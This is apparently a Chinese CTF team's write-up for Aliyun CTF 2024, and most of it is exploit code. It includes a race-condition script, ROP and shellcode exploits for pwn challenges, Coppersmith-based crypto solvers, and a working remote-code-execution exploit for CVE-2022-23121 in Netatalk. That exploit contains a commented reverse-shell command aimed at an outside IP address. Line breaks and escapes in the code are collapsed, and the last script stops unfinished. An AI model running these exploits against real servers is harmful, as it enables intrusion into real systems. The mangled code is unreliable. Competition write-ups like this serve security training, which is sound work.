# 阿里云CTF 2024 writeup

> 原文: https://www.ctfiot.com/170638.html
> ID: 170638

由杭州电子科技大学Vidar战队、西安电子科技大学L战队、电子科技大学CNSS战队以及杭州凌武科技有限公司凌武实验室战队联合组成的El3ctronic战队，在阿里云CTF 2024中，面对国内外各大强队，获得了第四名的佳绩！

OUTLINE

Web

Re

Pwn

Crypto

Misc

Web

web签到

Pastbin

func (rtr *Router) Handle(method string, pattern string, handlers []Handler) {    rtr.handle(method, pattern, func(resp http.ResponseWriter, req *http.Request) {       c := rtr.m.createContext(resp, req)       for _, h := range handlers {          c.mws = append(c.mws, getMWFromHandler(h))       }       c.run()    })}

package main
import (    "fmt"    "io"    "log"    "net/http"    "os"    "strings")
var url = "http://web2.aliyunctf.com:35084"
func main() {    limiter1 := make(chan struct{}, 64)    limiter2 := make(chan struct{}, 32)    go func() {       for {          limiter1 <- struct{}{}          go func() {             if SendSlash() {                os.Exit(0)             }          }()          <-limiter1          limiter1 <- struct{}{}          go func() {             if SendSlash() {                os.Exit(0)             }          }()          <-limiter1          <-limiter2       }    }()    var i = 0    go func() {       for {          limiter2 <- struct{}{}          i++          fmt.Println("try", i)          go func() {             if SendFlag() {                os.Exit(0)             }          }()       }    }()    select {}}
func SendSlash() bool {    get, err := http.Get(url + "/")    if err != nil {       log.Println(err)    }    if get != nil {       defer get.Body.Close()       return checkBody(get.Body)    }    return false}
func SendFlag() bool {    get, err := http.Get(url + "/flag")    if err != nil {       log.Println(err)    }    if get != nil {       defer get.Body.Close()       return checkBody(get.Body)    }    return false}
func checkBody(rd io.Reader) bool {    data, _ := io.ReadAll(rd)    if data == nil {       return false    }    if strings.Contains(string(data), "aliyunctf{") {       fmt.Println(string(data))       return true    }    return false}

easyCAS

Re

欧拉

#include<bits/stdc++.h>int mmm={...};int e[10][10],use[10][10];int flag[20];void dfs(int u,int len){    flag[len]=u;    if(len==17){        if(flag[1]>flag[2] && flag[3]<flag[4]&&flag[0] == flag[8]&&flag[11] == flag[15]&&flag[10] > flag[5]&&flag[3] < flag[13]&&flag[7] < flag[4]&&flag[14] == 7&&flag[17] == 4){            for(int i=0;i<18;i++)                printf("%d",flag[i]);            puts("");            exit(0);        }        return;    }    for(int v=0;v<9;v++)        if(e[u][v]&&!use[u][v]){            use[u][v]=use[v][u]=1;            dfs(v,len+1);            use[u][v]=use[v][u]=0;        }}int main(){    freopen("1.out","w",stdout);    for(int i=0;i<9;i++){        for(int j=0;j<9;j++){            e[i][j]=mmm[i*9+j];            // printf("%d ",e[i][j]);        }        // puts("");    }    for(int i=0;i<9;i++)        dfs(i,0);    return 0;}

Pwn

Pwn sign in

扣1malloc+edit

0x2d44处存在溢出，c0(改名后)0x300大小，但read0x500，可以覆盖ptr的值

def show_ptr():    nums = [0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1]    io.sendlineafter(b'hhh', b'1')    io.sendlineafter(b'size', str(0x500).encode())    io.send(b'n')    for i in nums:        io.sendline(str(i).encode())    io.sendlineafter(b'hhh', b'2')

https://www.cnblogs.com/LynneHuan/p/16104042.html

#!/usr/bin/python3.8# -*- encoding: utf-8 -*-from pwn import *from ctools import *
context(os="linux", arch="amd64", terminal=['tmux', 'splitw', '-h', '-F' '{pane_pid}', '-P']) # context.log_level = "debug"
proc = './pwn-sign_in'libc_path = './libc-2.31.so'
init_proc_with_libc(proc, libc_path)DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)
# io = process([proc])# io = process(['./ld-2.23.so', proc], env={'LD_PRELOAD': libc_path})io = remote('pwn0.aliyunctf.com', 9999)
elf = ELF(proc)libc = ELF(libc_path, checksec=False)

def assign_val(chunk_size, data, arrays):    io.sendafter(b"hhhn", b"1".ljust(4, b"x00"))    io.sendlineafter(b"size???n", str(chunk_size).encode())    io.sendline(data)    io.recvline(b"Lucky Numbersn")    for i in arrays:        io.sendline(str(i).encode())

def get_array(*indexs):    arr = [0] * 16    for i in indexs:        arr[i] = 3    return arr

def leak_addr():    arr = get_array(15, 13, 2, 3, 4, 14)    assign_val(0x500, b"a"*8, arr)    io.sendafter(b"hhhn", b"2".ljust(4, b"x00"))    # libc_base = recv_libc_addr(io, offset=0x1ebbe0)    # log_libc_base_addr(libc_base)
    io.recvuntil(b'a' * 0x8)        libc.address = u64(io.recv(6).ljust(8, b'x00')) - 0x1ebbe0 - 0x1000    success(hex(libc.address))

def rop_attack():    arr = get_array(15, 1, 2, 3, 4, 14, 6)    assign_val(0x10, b"deadbeef", arr)    io.sendafter(b"hhhn", b"2".ljust(4, b"x00"))    io.sendafter(b"xmkin", cyclic(0x200, n=8))    for _ in range(0x42):        io.sendline(str(0x61616161).encode())    io.sendline(b"-")    io.sendline(b"-")    io.sendline(str(0x61616161).encode())    io.sendline(str(0x61616161).encode())
    rop = ROP(libc)    target_addr = libc.symbols['__free_hook'] + 0x10    rop.call('read', [0, target_addr, 0x100])    rop.call('open', [target_addr, 0, 0])    rop.call('read', [3, target_addr, 0x50])    rop.call('write', [1, target_addr, 0x50])    payload = p64(libc.address + 0x119434) + rop.chain()    print(rop.dump())
    for i in range(0, len(payload), 4):        num = u32(payload[i:i+4])        io.sendline(str(num).encode())    # DEBUG('b * $rebase(0x2512)')    for _ in range(0x200-0x42-4-(len(payload) // 4)):        io.sendline(str(0x61616161).encode())        sleep(1)    io.sendline(b'/flag.txtx00')
    io.interactive()

def exp():    leak_addr()    rop_attack()
if __name__ == "__main__":    exp()

klang

I tried to write a toy compiler from scratch, but it's buggy af. Hopefully it's not insecure!nc pwn2.aliyunctf.com 9999attachment

function printNumbers(int n) : int i -> void{    i := 0;    do {        printi(i);        i := i + 1;    } while (i <= n);    return;}
function arrayTest() : int i, array arr -> void {    i := 0;    arr := array_new(10);    do {        printi(arr[0]);        i := i + 1;    } while (i <= 10);    return;}
function main() : -> int {    prints("123");    printNumbers(10);    arrayTest();    return 0;}

看 AST.cpp 比较清楚

编译命令（要把 wrapper.S 和 main.c 还有 api.c 一起链接）：

gcc -no-pie -o out ./out.S ./src/runtime/wrapper.S ./src/runtime/main.c ./src/runtime/api.c

ASAN_OPTIONS=detect_leaks=0 ./src/build/compiler/klang_asan ./1.k

(不知道哪里搞错了fuzz没跑起来(( afl-fuzz 说我的种子直接crash 了, 但是我自己手动跑是可以的((

看看脚本

klang/src/build via △ v3.28.3 ❯ echo $ASAN_OPTIONSdetect_leaks=0,abort_on_error=1,symbolize=0
klang/src/build via △ v3.28.3 ❯ ./compiler/klang out_dir/default/queue/id:000000,time:0,execs:0,orig:a
klang/src/build via △ v3.28.3 ❯ echo $?           0
klang/src/build via △ v3.28.3 ❯ afl-fuzz -i ./in_dir -o ./out_dir -- ./compiler/klang @@              afl-fuzz++4.08c based on afl by Michal Zalewski and a large online community[+] AFL++ is maintained by Marc "van Hauser" Heuse, Dominik Maier, Andrea Fioraldi and Heiko "hexcoder" Eißfeldt[+] AFL++ is open source, get it at https://github.com/AFLplusplus/AFLplusplus[+] NOTE: AFL++ >= v3 has changed defaults and behaviours - see README.md[+] Enabled environment variable ASAN_OPTIONS with value detect_leaks=0,abort_on_error=1,symbolize=0[+] No -M/-S set, autoconfiguring for "-S default"[*] Getting to work...[+] Using exponential power schedule (FAST)[+] Enabled testcache with 50 MB[+] Generating fuzz data with a length of min=1 max=1048576[*] Checking core_pattern...[*] Checking CPU scaling governor...[+] You have 20 CPU cores and 3 runnable tasks (utilization: 15%).[+] Try parallel jobs - see /usr/share/doc/aflplusplus-4.08c-r1/fuzzing_in_depth.md#c-using-multiple-cores[*] Setting up output directories...[+] Output directory exists but deemed OK to reuse.[*] Deleting old session data...[+] Output dir cleanup successful.[*] Checking CPU core loadout...[+] Found a free CPU core, try binding to #0.[*] Scanning './in_dir'...[+] Loaded a total of 1 seeds.[*] Creating hard links for all input files...[*] Validating target binary...[*] Spinning up the fork server...[+] All right - fork server is up.[*] Target map size: 11357[*] No auto-generated dictionary tokens to reuse.[*] Attempting dry run with 'id:000000,time:0,execs:0,orig:a'...
[-] Oops, the program crashed with one of the test cases provided. There are    several possible explanations:
    - The test case causes known crashes under normal working conditions. If      so, please remove it. The fuzzer should be seeded with interesting      inputs - but not ones that cause an outright crash.
    - In QEMU persistent mode the selected address(es) for the loop are not      properly cleaning up variables and memory. Try adding      AFL_QEMU_PERSISTENT_GPR=1 or select better addresses in the binary.
    - Least likely, there is a horrible bug in the fuzzer. If other options      fail, poke the Awesome Fuzzing Discord for troubleshooting tips.[!] WARNING: Test case 'id:000000,time:0,execs:0,orig:a' results in a crash, skipping[+] All test cases processed.
[-] PROGRAM ABORT : We need at least one valid input seed that does not crash!         Location : main(), src/afl-fuzz.c:2388

有 @@ 可以不用 — 了

试了也不行, 改了persistent跑起来了

我这能跑起来：

ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i ./fuzz/in -o ./fuzz/out ./src/build/compiler/klang @@

flex scanner jammed, 得改改(((

把 lexererror 改成直接返回, parse 的时候catch一下error, 可以过滤掉 parse 不了而报的错

出了个栈溢出

可能的问题：

指针/别名分析好像不太充分

function tester() : int a, string s -> void {    printi(a);    prints(s);    s := "Hello World!";    prints(s);    return;}
function main() : -> int {    tester();    return 0;}

Allocatables[] = { RCX, R8, R9, R10, R11, RSI, RDI };

加一层 wrapper 再去调用 vuln 就可以控制 RCE 并造成类型混淆

任意地址读 get：

function get_int(int i) : -> int {    return i;}
function arb_read() : string s1 -> void {    prints(s1);    s1 := "A";    prints(s1);    return;}
function do_leak() : int s1, int addr -> void {    prints("addr2leak:");    addr := inputi();    prints("arb_read:");    s1 := get_int(addr);    arb_read();    return;}
function write_gadget(int data) : array a1 -> void {    a1[0] := data;    a1 := array_new(1); /* do not opt me !*/    return;}
function arb_write(int fa, int data) : int a1 -> void {    a1 := fa;    write_gadget(data);    printi(a1);    return;}
function do_write() : array a1, int dp, int wp, int wd -> void {    prints("array_leak:");    a1 := array_new(0x10);    arb_read();    prints("dp:");    dp := inputi();    prints("wp:");    wp := inputi();    prints("wd:");    wd := inputi();    a1[0] := wp;    a1[1] := 1;    arb_write(dp, wd);    return;}
function main() : int t, int i -> int {    do_leak();    do_leak();    i := 12;    do {        do_write();        i := i -1;    }    while (i >= 0);    do_write();    prints("trigger");    return 0;}

from pwn import *
#p = process("./out", env={"LD_PRELOAD":"./libc-2.31.so"})p = process("./out")context.log_level = "debug"context.arch = "amd64"elf = ELF("./out")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elb_base = 0x400000puts_got = 0x404018
def arb_write(addr, data):    # leak data_ptr    p.recvuntil(b"array_leak:n")    data_ptr = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("data_ptr:", hex(data_ptr))    p.recvuntil(b"dp:n")    p.sendline(str(data_ptr).encode())    # arb_write test    p.recvuntil(b"wp:n")    p.sendline(str(addr).encode())    p.recvuntil(b"wd:n")    p.sendline(str(data).encode())
def exp():    #gdb.attach(p, "b *0x4012c4ncn")    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(puts_got).encode())    p.recvuntil(b"arb_read:n")    puts = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("puts:", hex(puts))    libc_base = puts - libc.symbols["puts"]    print("libc_base:", hex(libc_base))    environ = libc_base + libc.symbols["environ"]    print("environ:", hex(environ))    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(environ).encode())    p.recvuntil(b"arb_read:n")    stack_leak = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("stack_leak:", hex(stack_leak))
    # write shellcode to stack    shellcode = asm(shellcraft.sh())    # ajust shellcode to 4 bytes align    shellcode = shellcode.ljust((len(shellcode) + 3) & ~3, b"x90")    print("shellcode len:", hex(len(shellcode)))    for i in range(len(shellcode)//4):        arb_write(stack_leak + i*4, u32(shellcode[i*4:i*4+4]))        print("write done:", i)
    # hijack puts    arb_write(puts_got, stack_leak)    
    gdb.attach(p)    p.interactive()
if __name__ == "__main__":    exp()

Final EXP：

exp.k

本地编译：./bin/klang ./exp.k && gcc -no-pie -o out out.S src/runtime/wrapper.S ./src/runtime/main.c ./src/runtime/api.c

压缩了空间，远程限制 1024 字节

function get_int(int i) : -> int {    return i;}function arb_read() : string s1 -> void {    prints(s1);    s1 := "A";    prints(s1);    return;}function do_leak() : int s1, int addr -> void {    prints("addr2leak:");    addr := inputi();    prints("arb_read:");    s1 := get_int(addr);    arb_read();    return;}function write_gadget(int data) : array a1 -> void {    a1[0] := data;    a1 := array_new(1); /* do not opt me !*/    return;}function arb_write(int fa, int data) : int a1 -> void {    a1 := fa;    write_gadget(data);    printi(a1);    return;}function do_write() : array a1, int dp, int wp, int wd -> void {    prints("array_leak:");    a1 := array_new(0x10);    arb_read();    prints("dp:");    dp := inputi();    prints("wp:");    wp := inputi();    prints("wd:");    wd := inputi();    a1[0] := wp;    a1[1] := 1;    arb_write(dp, wd);    return;}function main() : int t, int i -> int {    do_leak();    do_leak();    i := 12;    do {        do_write();        i := i -1;    }    while (i >= 0);    do_write();    prints("trigger");    return 0;}END_OF_SNIPPET

from pwn import *import hashlib, string, struct, sys
#p = process("./out", env={"LD_PRELOAD":"./libc-2.31.so"})p = remote("pwn2.aliyunctf.com", 9999)#p = process("./out")context.log_level = "debug"context.arch = "amd64"#elf = ELF("./out")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elb_base = 0x400000puts_got = 0x404018
def solve_pow(chal, n):  r = 0  while True:    s = chal + struct.pack("<Q", r)    h = int(hashlib.sha256(s).hexdigest(), 16)    if h % (2 ** n) == 0:      break    r += 1  return r
def arb_write(addr, data):    # leak data_ptr    p.recvuntil(b"array_leak:n")    data_ptr = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("data_ptr:", hex(data_ptr))    p.recvuntil(b"dp:n")    p.sendline(str(data_ptr).encode())    # arb_write test    p.recvuntil(b"wp:n")    p.sendline(str(addr).encode())    p.recvuntil(b"wd:n")    p.sendline(str(data).encode())
def exp():    p.recvuntil(b"Give me your team token.n")    p.sendline(b"SuSarzbhSn2LApDv8+1V3Q==")    p.recvuntil(b"./pow_solver.py ")    chal = p.recvuntil(b" ", drop=True)    n = int(p.recvuntil(b" ", drop=True).decode())    print(F"POW({chal.decode()}, {n})")    pow_res = solve_pow(chal, n)    print("pow_res:", pow_res)    p.sendline(str(pow_res).encode())
    p.recvuntil(b"(excluding quote).n")    with open("exp.k", "rb") as f:        p.sendline(f.read())
    pause(1)
    #gdb.attach(p, "b *0x4012c4ncn")    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(puts_got).encode())    p.recvuntil(b"arb_read:n")    puts = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("puts:", hex(puts))    libc_base = puts - libc.symbols["puts"]    print("libc_base:", hex(libc_base))    environ = libc_base + libc.symbols["environ"]    print("environ:", hex(environ))    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(environ).encode())    p.recvuntil(b"arb_read:n")    stack_leak = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("stack_leak:", hex(stack_leak))
    # write shellcode to stack    shellcode = asm(shellcraft.sh())    # ajust shellcode to 4 bytes align    shellcode = shellcode.ljust((len(shellcode) + 3) & ~3, b"x90")    print("shellcode len:", hex(len(shellcode)))    for i in range(len(shellcode)//4):        arb_write(stack_leak + i*4, u32(shellcode[i*4:i*4+4]))        print("write done:", i)
    # hijack puts    arb_write(puts_got, stack_leak)
    pause(1)
    p.sendline("cat /flag")    
    #gdb.attach(p)    p.interactive()
if __name__ == "__main__":    exp()

Netatalk

CVE-2022-23121 https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/

给的 example 已经伪造好了能够触发漏洞的 resource fork, 接下来调用 FPOpenFork 打开 test_file, 需要设置 flag = 2.

利用这句将栈上的 libc 地址写到 ad->data 中, 然后 munmap 写到 resource fork 文件中.

memcpy(adbuf + ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);

直接读取不能从头开始读, 泄漏不了写在 0x32 的地址.

一翻乱玩发现 FPOpenFork 在有 test_file 时不能直接打开 ._test_file 并读取, 但是如果只有 ._test_file 时会看作普通的文件. 于是调整了一下创建文件的顺序, 先创建 ._test_file 然后不 close 文件保留 fork fd, 触发后用最开始打开的 fork fd 读取可以.

利用下面这句, 将 ld 上的 _dl_rtld_lock_recursive 改写成 system, 同时将 _dl_load_lock 写上命令.

memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,        map + ad_getentryoff(ad, ADEID_RFORK),        ad_getentrylen(ad, ADEID_RFORK));

虽然之后 ad_rebuild_adouble_header_osx 会导致段错误, 但是依旧能够走到 ld 中去退出, 从而触发 system.

反弹 shell 没成功不知道为什么, 把 flag copy 到 /home/xxxx/shared 下, 用 APF 读取.

#! /usr/bin/env python3# -*- coding: utf-8 -*-#from pwn import *context(arch = 'i386', os = 'linux', endian='little')context.log_level = 'info'
libc = ELF('libc-2.27.so')ld = ELF('ld-2.27.so')
import socketimport structimport sysimport timefrom afputils import *
# Helper function to create AppleDouble metadata header# you can modify the header as you want...def createAppleDouble_leak():  header = p32(0x51607)                     #Magic number double  header += p32(0x20000)                    #Version number  header += p8(0) * 16                      #Filler  header += p16(2)                          #Number of entries  header += p32(9)                          #Entry Id Finder Info  header += pack(0x7fa, 32, 'big', True)         # offset  header += p32(30)                         # Set length other than 32 to call 'ad_convert_osx'  header += p32(2)                          # Type Ressource fork  header += p32(0x100)                      # #Control the mmap size  header += p32(0)                          # length  ############  # usefull to find adouble offset  ###########  header += b'abcdefghijklmnopqrstuvwzxy1234567890'  return header
def createAppleDouble_write(system):  header = p32(0x51607)                     #Magic number double  header += p32(0x20000)                    #Version number  header += p8(0) * 16                      #Filler  header += p16(2)                          #Number of entries  header += p32(9)                          #Entry Id Finder Info  header += pack(0x4504, 32, 'big', True)         # offset  header += p32(30)                         # Set length other than 32 to call 'ad_convert_osx'  header += p32(2)                          # Type Ressource fork  header += p32(0x32)                      # #Control the mmap size  header += p32(0x32c + 8)                          # length  ############  # usefull to find adouble offset  ###########  # header += b'bash -i >& /dev/tcp/107.173.159.203/8000 0>&1x00'.ljust(0x32c) + p32(system, endian='little')  header += b'cat /flag.txt > /home/xxxx/shared/flagx00'.ljust(0x32c) + p32(system, endian='little')  return header
# ip and port of the local netatalk serverip = "127.0.0.1"port = 5548volume = "Shared"
p = connect(ip, port)response, request_id = DSIOpenSession(p, debug)response, request_id = FPLogin(p, request_id, b'AFP3.3', b'No User Authent', None, debug)response, request_id, volume_id = FPOpenVol(p, request_id, 0x21, bytes(volume,encoding='utf-8'), None, debug)
# rm fileresponse, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"test_file")response, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"test_file_2")response, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"._test_file")response, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"._test_file_2")
# create an appledouble metadata headerappledouble = createAppleDouble_leak()# create an appledouble metadata file for "test_file"response, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"._test_file", debug)response, request_id, fork2 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"._test_file", debug)response, request_id = FPWriteExt(p, request_id, fork2, 0, len(appledouble), appledouble, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork2, debug)
# create a simple file named "test_file" with data insideresponse, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"test_file", debug)response, request_id, fork1 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"test_file", debug)
data = b'Hello World !'
# write data into the fileresponse, request_id = FPWriteExt(p, request_id, fork1, 0, len(data), data, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork1, debug)
# leakresponse, request_id, fork3 = FPOpenFork(p, request_id, 2, volume_id, 2, 0, 3, 2, b"test_file", debug)response, request_id = FPReadExt(p, request_id, fork2, 0x32, 4, debug)libc.address = u32(response[0x10:], endian = 'little') - 0x170e7print(hex(libc.address))# response, request_id = FPCloseFork(p, request_id, fork3, debug)
# create an appledouble metadata headerappledouble = createAppleDouble_write(libc.sym.system)# create an appledouble metadata file for "test_file"response, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"._test_file_2", debug)response, request_id, fork2 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"._test_file_2", debug)response, request_id = FPWriteExt(p, request_id, fork2, 0, len(appledouble), appledouble, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork2, debug)
# create a simple file named "test_file" with data insideresponse, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"test_file_2", debug)response, request_id, fork1 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"test_file_2", debug)
data = b'Hello World !'
# write data into the fileresponse, request_id = FPWriteExt(p, request_id, fork1, 0, len(data), data, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork1, debug)
# triggertry:  response, request_id, fork3 = FPOpenFork(p, request_id, 2, volume_id, 2, 0, 3, 2, b"test_file_2", debug)except Exception as e:  pass
DSICloseSession(p, request_id, debug)
p.close()
p = connect(ip, port)response, request_id = DSIOpenSession(p, debug)response, request_id = FPLogin(p, request_id, b'AFP3.3', b'No User Authent', None, debug)response, request_id, volume_id = FPOpenVol(p, request_id, 0x21, bytes(volume,encoding='utf-8'), None, debug)
response, request_id, fork4 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"flag", debug)response, request_id = FPReadExt(p, request_id, fork4, 0, 0x100, debug)print(response[0x10:])
DSICloseSession(p, request_id, debug)p.close()

Crypto

BabyDH1

直接传 Bob_pk，然后二元 Coppersmith 去解 shared_AB。

有论文提到这个的：https://link.springer.com/chapter/10.1007/978-3-031-19685-0_6，把这个实现一下就行了。

#final exp
from sage.all import *from Crypto.Cipher import AESfrom ecdsa import NIST256pfrom ecdsa.ecdsa import Public_keyfrom ecdsa.ellipticcurve import Pointfrom hashlib import sha256from os import urandomfrom random import seed, choice, randrangefrom signal import signal, alarm, SIGALRMfrom string import ascii_letters, ascii_lowercase, digitsfrom sys import stdinfrom pwn import *

E = NIST256p.curvem = 2**211p=int(E.p())Fp=GF(p)El=EllipticCurve(GF(p),[E.a(),E.b()])
def proof(r):    text=r.recvline()    print(text)    tmp=text.split(b'XXXX + ')[-1]    suf,val=tmp.strip().split(b') == ')    suf=suf.decode()    val=val.decode()    poss=ascii_letters + digits    for a in poss:        for b in poss:            for c in poss:                for d in poss:                    digest = sha256((a+b+c+d+suf).encode()).hexdigest()                    if(digest==val):                        r.sendline((a+b+c+d).encode())                        return
def get_Ax_Bx_encsign(r):    text=r.recvuntil(b'Now, it is your turn:')    print(text.decode())    text=text.split(b'Hi, Bob! Here is my public key: ')[-1]    Ax,text=text.split(b'nHi, Alice! Here is my public key: ')    Bx,enc_sign=text.split(b'n')[:2]    print(Ax,Bx,enc_sign)    return int(Ax.decode(),16),int(Bx.decode(),16),bytes.fromhex(enc_sign.decode())
def send_point(r,P):    px,py=P[0],P[1]    print(hex(px))    r.sendline(hex(px)[2:].encode())    r.sendline(hex(py)[2:].encode())    def get_leak(r):    text=r.recvuntil(b'Leak: ')    text=r.recv()    print(text)    lx,ly=text.split(b', ')    return int(lx.decode(),16),int(ly.decode(),16)    r=remote("crypto0.aliyunctf.com","12346")proof(r)Ax,Bx,enc_sign=get_Ax_Bx_encsign(r)print(enc_sign.hex())send_point(r,El.lift_x(Fp(Bx)))low_x,low_y=get_leak(r)
from re import findallfrom subprocess import check_output
def flatter(M):    # compile https://github.com/keeganryan/flatter and put it in $PATH    z = "[[" + "]n[".join(" ".join(map(str, row)) for row in M) + "]]"    ret = check_output(["flatter"], input=z.encode())    return matrix(M.nrows(), M.ncols(), map(int, findall(b"-?\d+", ret)))
def find_root(p, f, bounds, m, t):    # print(bounds)    f /= f.coefficients().pop(0)    # print(f)    f = f.change_ring(ZZ)    pr=f.parent()    x,y=pr.gens()        G = Sequence([], f.parent())    for k in range(m+1):        g=f**k*p**(m-k)        for j in range(2*(m-k)+t+1):            G.append(g*y**j)        for i in range(2):            g*=x            for j in range(2*(m-k)+t-1):                G.append(g*y**j)        B, monomials = G.coefficient_matrix()    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]    for i, factor in enumerate(factors):        B.rescale_col(i, factor)    B = flatter(B.dense_matrix())    B = B.change_ring(QQ)    for i, factor in enumerate(factors):        B.rescale_col(i, 1/factor)
    H = Sequence([], f.parent().change_ring(QQ))    for h in filter(None, B*monomials):        H.append(h)    return H
R.<x,y>=PolynomialRing(Fp)x,y=R.gens()B=p//m//2f=((y+B)*m+low_y)^2-((x+B)*m+low_x)^3-int(E.a())*((x+B)*m+low_x)-int(E.b())indexx = 10mypols = find_root(p,f,[B,B],6,1)[:indexx]
def find_prime_root(pp, idx):    root = []    PRs = PolynomialRing(GF(pp), 2,'a,b', order='lex')    a,b = PRs.gens()    mynew_pol = []    for i in mypols:        mynew_pol.append(PRs(i))    I1 = ideal(mynew_pol)    GB = I1.groebner_basis()    res = GB[-1].univariate_polynomial().roots()    if len(res) == 1:        ans = int(res[0][0])        root.append(ans)    else:        return []    res = GB[-2](b=root[0]).univariate_polynomial().roots()    if len(res) == 1:        ans = int(res[0][0])        root.append(ans)    else:        return []    root.append(pp)    sec[idx] = root
base = primes_first_n(30)[3:]sec = [0]*len(base)threads = []for i in range(len(base)):    find_prime_root(base[i], i)xi = []yi = []pp = []for root in sec:    if root:        yi.append(root[0])        xi.append(root[1])        pp.append(root[2])
xx,yy=crt(xi,pp),crt(yi,pp)P=product(pp)
def find_real(xx,yy,f):    if(f(xx,yy)==0):        return xx,yy    if(f(xx-P,yy)==0):        return xx-P,yy    if(f(xx,yy-P)==0):        return xx,yy-P    if(f(xx-P,yy-P)==0):        return xx-P,yy-Preal_x,real_y=find_real(xx,yy,f)shared_AB=(real_x+B)*m+low_x,(real_y+B)*m+low_yprint(shared_AB)
key = sha256(str(shared_AB).encode()).digest()sign=AES.new(key,AES.MODE_ECB).decrypt(enc_sign).split(b'Secret sign is ')[-1]r.sendline(AES.new(key,AES.MODE_ECB).encrypt(sign[:-1]).hex().encode())print(r.recvall())
# aliyunctf{Coppersmith_in_the_wild!}

BabyDH2

这个题可以和论文里的互相转化。

传 (Bob_pk+[t]G)，得到 Alice_sk*Bob_pk+Alice_sk*[t]*G=shared_AB+[t]*Alice_pk，就是论文里的形式。

#final exp
from sage.all import *from Crypto.Cipher import AESfrom ecdsa import NIST256pfrom ecdsa.ecdsa import Public_keyfrom ecdsa.ellipticcurve import Pointfrom hashlib import sha256from os import urandomfrom random import seed, choice, randrangefrom signal import signal, alarm, SIGALRMfrom string import ascii_letters, ascii_lowercase, digitsfrom sys import stdinfrom pwn import *from re import findallfrom subprocess import check_output
E = NIST256p.curvem = 2**164p=int(E.p())Fp=GF(p)El=EllipticCurve(GF(p),[E.a(),E.b()])
def proof(r):    text=r.recvline()    print(text)    tmp=text.split(b'XXXX + ')[-1]    suf,val=tmp.strip().split(b') == ')    suf=suf.decode()    val=val.decode()    poss=ascii_letters + digits    for a in poss:        for b in poss:            for c in poss:                for d in poss:                    digest = sha256((a+b+c+d+suf).encode()).hexdigest()                    if(digest==val):                        r.sendline((a+b+c+d).encode())                        return
def get_Ax_Bx_encsign(r):    text=r.recvuntil(b'Now, it is your turn:')    # print(text.decode())    text=text.split(b'Hi, Bob! Here is my public key: ')[-1]    Ax,text=text.split(b'nHi, Alice! Here is my public key: ')    Bx,enc_sign=text.split(b'n')[:2]    return int(Ax.decode(),16),int(Bx.decode(),16),bytes.fromhex(enc_sign.decode())
def send_point(r,P):    px,py=P[0],P[1]    r.sendline(hex(px)[2:].encode())    r.sendline(hex(py)[2:].encode())    text=r.recvuntil(b'Leak: ')    print(text)    text=r.recvline().strip()    print(text)    return int(text.decode(),16)
E = NIST256p.curveG = NIST256p.generatorm = 2**164n = G.order()Fp=GF(p)a=int(E.a())b=int(E.b())El=EllipticCurve(GF(p),[a,b])
def flatter(M):    # compile https://github.com/keeganryan/flatter and put it in $PATH    z = "[[" + "]n[".join(" ".join(map(str, row)) for row in M) + "]]"    ret = check_output(["flatter"], input=z.encode())    return matrix(M.nrows(), M.ncols(), map(int, findall(b"-?\d+", ret)))
a=int(E.a())b=int(E.b())p=int(E.p())PR = PolynomialRing(Zmod(p),'e',6)es = PR.gens()e0,e1,e2,e3,e4,e5 = esmmm = mB=p//mmmB0=B//2leak0 = send_point(r,pk_B+0*pk_G)gabx = leak0 + mmm * (e0+B0)
leak1 = send_point(r,pk_B+1*pk_G)leak_1= send_point(r,pk_B-1*pk_G)leak1_= int(leak1)+int(leak_1)Q1x   = int((pk_A * 1)[0])left1 = (leak1_ + mmm*(e1+B)) * (gabx - Q1x)**2right1= 2*(a*(gabx+Q1x)+2*b+Q1x*gabx*(Q1x+gabx))F1    = left1 - right1F1   *= int(inverse_mod(F1.coefficients()[0],p))
leak2 = send_point(r,pk_B+2*pk_G) leak_2= send_point(r,pk_B-2*pk_G) # DH(Alice_sk, -2*G + Bob_pk) % m leak2_= int(leak2)+int(leak_2)Q2x   = int((pk_A * 2)[0])left2 = (leak2_ + mmm*(e2+B)) * (gabx - Q2x)**2right2= 2*(a*(gabx+Q2x)+2*b+Q2x*gabx*(Q2x+gabx))F2    = left2 - right2F2   *= int(inverse_mod(F2.coefficients()[0],p))
